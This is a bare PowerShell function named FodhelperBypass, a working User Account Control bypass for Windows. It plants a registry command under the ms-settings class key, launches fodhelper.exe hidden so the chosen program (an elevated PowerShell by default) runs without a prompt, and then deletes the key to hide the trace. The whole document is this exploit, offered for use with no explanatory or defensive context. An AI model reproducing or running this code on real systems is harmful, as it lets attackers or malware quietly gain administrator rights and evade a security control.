function FodhelperBypass() {
Param (
[String]$program = "cmd /c start powershell.exe"
)
New-Item HKCU:\Software\Classes\ms-settings\Shell\Open\command -Value $program -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
Start-Sleep 3
Remove-Item HKCU:\Software\Classes\ms-settings\ -Recurse -Force
}

